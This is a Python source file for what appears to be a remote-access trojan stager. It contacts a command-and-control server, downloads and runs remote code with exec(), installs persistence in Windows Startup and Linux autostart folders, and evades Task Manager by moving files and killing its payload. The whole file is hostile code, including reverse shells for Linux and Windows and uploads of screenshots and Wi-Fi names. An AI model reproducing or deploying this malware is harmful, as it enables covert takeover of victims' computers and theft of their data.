import subprocess
import psutil
import time
import os
import platform
import requests
import shutil
import getpass
import threading
from socket import *
from datetime import timezone, datetime, timedelta
import sys
from ctypes import *
from PIL import ImageGrab
from cryptography.fernet import Fernet

#-  file dropper
#-  voice record
#-  remote desktop
#-  file grabber

OS = platform.uname()[0]
if OS == "Windows":
    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()

### NAME OF PAYLOAD AND STAGER FILES YOU CAN NAME ANYTHING YOU WANT, DO NOT INCLUDE EXTENTIONS EX. .EXE OR .BIN

_PAYLOAD_NAME = "payload"
_STAGER_NAME = "stager"

### IF AUTO START == 1, STAGER WILL CHECK THAT IT IS RUNNING IN AUTOSTART MODE

_AUTOSTART_STAGER = 1
_AUTOSTART_STAGER_DESKTOP_SHORTCUTS = 0

_DETECT_SANDBOX = 1

### FULL ADDRESS TO THE WEBSERVER

_WEB_SERVER = "127.0.0.1:3000"

### REMOVE FROM STARTUP UNTIL TASKMANAGER IS CLOSED WINDOWS ONLY ###

_WIN_TASK_MANANGER_REMOVE_STARTUP = 0
_HIDE_FROM_TASK_MANAGER = 0

### DETECT VIRTUAL MACHINE ###

_REMOVE_IF_IN_VM = 1

### PAYLOAD STAGING OPTIONS ###
# 1 = EVAL SCRIPT FROM URL IN MEMORY#
# 2 = DOWNLOAD BINARY TO DISK AND EXECUTE #

_STAGING_OPT = 1

root = 0

### If staging == 1, load these variable's , eval payload needs these variables to run properly ###
###################################################################################################
    
if _STAGING_OPT == 1:
    import random
    import shlex
    import datetime
    from datetime import datetime
    import PIL

    if OS == "Windows":
        pass
    else:pass
    
### PAYLOAD OPTIONS ###
    _FAST_ROOT_OPT = 0
    _REG_URL = 'http://{0}/register'.format(_WEB_SERVER)
    _CHECK_IF_REGISTERED = 'http://{0}/check_if_registered'.format(_WEB_SERVER)
    _CHECK_FOR_COMMAND = 'http://{0}/command'.format(_WEB_SERVER)
    _OS = platform.uname()[0]
    username = getpass.getuser()

### Get current clients ip address from master server ###
    def get_ip():
        try:
                proc = requests.get('http://{0}/getip'.format(_WEB_SERVER))
                return proc.content.decode('utf8')

        except Exception as e:
            pass
            
    _MY_IP = get_ip()
    while _MY_IP == None:
        _MY_IP = get_ip()

### Get current clients master reverse shell information ###
    def get__RSHELL_OPT_ip():
        try:
            proc = requests.get('http://{0}/rshell/{1}/{2}/{3}'.format(_WEB_SERVER, _MY_IP, getpass.getuser(), current_machine_id))
            return proc.content.decode('utf8')
        except Exception as e:
            pass
    
### Requests to insert found wifi names into database ###
    def insert_wifi_name(wifi_name):
        try:
            proc = requests.get('http://{0}/wifi_name/{1}/{2}'.format(_WEB_SERVER, current_machine_id, wifi_name))
        except Exception as e:
            pass

    def upload_screenshot(SCREENSHOT):
        try:
            
            with open(SCREENSHOT, "rb") as f:
                requests.post("http://{0}/upload/screenshot/{1}/{2}/{3}".format(_WEB_SERVER, _MY_IP, username, current_machine_id ), files={"file": f})
            
        except Exception as e:
            pass
    
    ### Get current clients master reverse shell information ###
    def get_client_settings():
        try:
            proc = requests.get('http://{0}/settings/{1}'.format(_WEB_SERVER, current_machine_id))
            settings = proc.content.decode('utf8').replace("'", "").replace(",", "").replace("(", "").replace(")", "").replace("[", "").replace("]", "").split()
            print(settings[1])
            
            if settings[0] == 1 :
                _AUTOSTART_STAGER == 1
            else:
                _AUTOSTART_STAGER == 0
            
            return proc.content.decode('utf8')
        except Exception as e:
            print(e)

### Reverse shell function ###
    def _RSHELL_OPT_():
        try:
            if platform.uname()[0] == "Linux":
                    try:
                        exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'.format(get__RSHELL_OPT_ip().split()[0], get__RSHELL_OPT_ip().split()[1]))
                    except Exception as e:
                        timer = threading.Timer(5, _RSHELL_OPT_)
                        timer.start()
                        pass
                        
            elif platform.uname()[0] == "Windows":
                import os,socket,subprocess,threading;
                def s2p(s, p):
                    while True:
                        data = s.recv(1024)
                        if len(data) > 0:
                            p.stdin.write(data)
                            p.stdin.flush()

                def p2s(s, p):
                    while True:
                        s.send(p.stdout.read(1))
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(("{0}".format(get__RSHELL_OPT_ip().split()[0]), int(get__RSHELL_OPT_ip().split()[1])))
                p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
                s2p_thread = threading.Thread(target=s2p, args=[s, p])
                s2p_thread.daemon = True
                s2p_thread.start()
                p2s_thread = threading.Thread(target=p2s, args=[s, p])
                p2s_thread.daemon = True
                p2s_thread.start()
                try:
                    p.wait()
                except KeyboardInterrupt:
                    s.close()
                    timer = threading.Timer(5, _RSHELL_OPT_)
                    timer.start()
                    pass
        except Exception as e:
            pass

### DOWNLOAD LINKS FOR PAYLOAD AND WATCH DOG
if OS == "Linux":
    _PAYLOAD_LINK = "http://{0}/downloads/linux/payload".format(_WEB_SERVER)
    _STAGER_LINK = "http://{0}/downloads/linux/stager".format(_WEB_SERVER)
    
elif OS == "Windows":
    _PAYLOAD_LINK = "http://{0}/downloads/windows/payload".format(_WEB_SERVER)
    _STAGER_LINK = "http://{0}/downloads/windows/stager".format(_WEB_SERVER)

def start_windows_payload():
    subprocess.call("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME))

### IF OPTION TO AUTOSTART WATCH DOG IS ENABLED, PROCCEED WITH THIS FUNCTION ###
if _AUTOSTART_STAGER == 1:
    if platform.uname()[0] == "Linux":
        try:
            if _STAGER_NAME in os.listdir("/home/{0}/.config/".format(getpass.getuser())):
                pass

        except Exception as e:
            pass
        else:
            try:
                requests.get(_STAGER_LINK)
                r = requests.get(_STAGER_LINK)
                file = open("./{0}".format(_STAGER_NAME), 'wb')
                subprocess.Popen(["chmod", "+x", "{0}".format(_STAGER_NAME)])
                file.write(r.content)
                file.close()
                shutil.move("./{0}", "/home/{1}/.config/".format(_STAGER_NAME, getpass.getuser()))
                with open("{0}.desktop".format(_STAGER_NAME), "w") as FILE:
                    _STARTUP_LINES = ["[Desktop Entry]", "Type=Application", "Version=1.0", "Name={0}".format(_STAGER_NAME),
                     "Comment=none", "Exec=/home/{0}/.config/{1}".format(getpass.getuser(), _STAGER_NAME), "StartupNotify=false",
                     "Terminal=false"]
                    for LINES in _STARTUP_LINES:
                        FILE.writelines(LINES + "\n")
                    FILE.close()
                shutil.move("./{0}.desktop".format(_STAGER_NAME), "/home/{0}/.config/autostart".format(getpass.getuser()))
            except Exception as e:
                pass
            
    elif platform.uname()[0] == "Windows":
        try:
            if "{0}.exe".format(_STAGER_NAME) in os.listdir("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(getpass.getuser())):
                pass
            else:
                    requests.get(_STAGER_LINK)
                    r = requests.get(_STAGER_LINK)
                    file = open("./{0}.exe".format(_STAGER_NAME), 'wb')
                    file.write(r.content)
                    file.close()
                    shutil.move("./{0}.exe".format(_STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(getpass.getuser()))
        except Exception as e:
            pass

### DESCRYPT PAYLOAD AND EXEC IT ###
def exec_payload_thread():
    r = requests.get("http://{0}/remote".format(_WEB_SERVER))
    exec(r.text)

if _STAGING_OPT == 1:
    threading.Thread(target=exec_payload_thread).start()
    
while 1:
    time.sleep(1)
    RUNNING = 0
    _WIN_TASK_MANAGER_RUNNING = 0
    for PROC in psutil.process_iter():
        if _STAGING_OPT == 2:
            if PROC.name() == "payload.exe":
                RUNNING = 1
        if _HIDE_FROM_TASK_MANAGER == 1:
            if PROC.name() == "Taskmgr.exe":
                _WIN_TASK_MANAGER_RUNNING = 1
                
                if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                    pass
                else:
                    shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft".format(getpass.getuser()))
            
### IF PAYLOAD NOT RUNNING CHECK IF EXISTS. IF NOT DOWNLOAD AND START ###
    if _STAGING_OPT == 2:
        if RUNNING == 0:
            if _WIN_TASK_MANAGER_RUNNING == 1:
                pass
            else:
                try:
                    if OS == "Linux":
                        if os.path.exists("/home/{0}/.config/{1}".format(getpass.getuser(), _PAYLOAD_NAME)):
                            subprocess.Popen(["chmod", "+x", "{0}".format(_PAYLOAD_NAME)])
                            subprocess.call("./home/{0}/.config/{0}".format(getpass.getuser(), _PAYLOAD_NAME))
                        
                    elif OS == "Windows":
                        if _WIN_TASK_MANAGER_RUNNING == 1:
                            pass
                        
                        else:
                            ### IF PAYLOAD NOT IN THE PATH DOWNLOAD FROM LINK ###
                            if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME)):
                                threading.Thread(target=start_windows_payload).start()
                                time.sleep(5)
                                
                            else:
                                requests.get(_PAYLOAD_LINK)
                                r = requests.get(_PAYLOAD_LINK)
                                file = open("./{0}.exe".format(_PAYLOAD_NAME), 'wb')
                                file.write(r.content)
                                file.close()
                                shutil.move("./{0}.exe".format(_PAYLOAD_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME))
                            
                except Exception as e:
                    pass   

### CHECK IF TASK MANAGER IS RUNNING CROSSPLATFORM ###
    if _WIN_TASK_MANAGER_RUNNING == 1:
        try:
                if OS == "Linux":
                    if os.path.exists("/home/{0}/.config/{1}".format(getpass.getuser(), _PAYLOAD_NAME)):
                        pass
                    
                elif OS == "Windows":

### IF PAYLOAD IS RUNNING WHILE TASKMANAGER IS RUNNING, KILL IT ###
                    if _STAGING_OPT == 2:
                        for PROC in psutil.process_iter():
                            if PROC.name() == "payload.exe":
                                os.system("taskkill /f /im payload.exe")

### IF STAGER IS IN STARTUP FOLDER WHILE TASKMANAGER IS OPEN, HIDE IT IN ANOTHER FOLDER ###                    
                    if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                        if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                            os.remove("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME))

                        shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft".format(getpass.getuser()))
                        
                        PROC_LIST = []
                        while _WIN_TASK_MANAGER_RUNNING == 1:
                            for PROC in psutil.process_iter():
                                if PROC.name() == "Taskmgr.exe":
                                    PROC_LIST.append("Taskmgr")
                                                              
                                if len(PROC_LIST) == 0:
                                    _WIN_TASK_MANAGER_RUNNING = 0
                                    
                            PROC_LIST = []
                            time.sleep(1)                        
                            
        except Exception as e:
            pass

### WHEN TASK MANAGER IS NO LONGER OPENED MOVE STAGER FILE BACK TO THE STARTUP FOLDER ###
    if _WIN_TASK_MANAGER_RUNNING == 0:
        if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
            if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                os.remove("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME))
            shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\".format(getpass.getuser()))

            
